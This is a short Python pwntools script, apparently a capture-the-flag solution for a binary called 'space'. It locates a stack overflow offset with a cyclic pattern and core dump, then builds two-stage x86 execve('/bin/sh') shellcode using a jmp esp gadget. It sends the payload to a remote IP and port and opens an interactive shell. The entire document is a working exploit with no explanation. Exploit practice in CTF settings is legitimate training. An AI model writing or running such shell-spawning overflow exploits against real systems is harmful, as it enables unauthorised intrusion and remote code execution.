# coding: utf-8
from pwn import *

HOST, PORT = "139.59.202.58", 31026
elf = context.binary = ELF("./space")

r = elf.process()
r.recvuntil(">")
r.sendline(cyclic(1024))
r.wait()
r.close()

core = Coredump("./core")
buffer_size = cyclic_find(core.fault_addr)

# This part goes to buffer (the first part will jump there)
shellcode2 = asm("push eax")
shellcode2 += asm("push 0x68732f2f")
shellcode2 += asm("push 0x6e69622f")
shellcode2 += asm("mov ebx, esp")
shellcode2 += asm("mov al, 0xb")
shellcode2 += asm("int 0x80")
assert len(shellcode2) <= buffer_size

# gadget: jmp esp
eip = p32(0x0804919f)

# gadget makes eip jump there
shellcode1 = asm("xor edx, edx") # *envp = NULL
shellcode1 += asm("xor eax, eax") # null-terminator
shellcode1 += asm("sub esp, " + hex(buffer_size + 4)) # Jumps to the buffer
shellcode1 += asm("jmp esp")

payload = "\x90" * (buffer_size - len(shellcode2)) + shellcode2 + eip + shellcode1
# "read" function limits input length
assert len(payload) <= 31

r = remote(HOST, PORT)
r.recvuntil(">")
r.sendline(payload)
r.interactive()
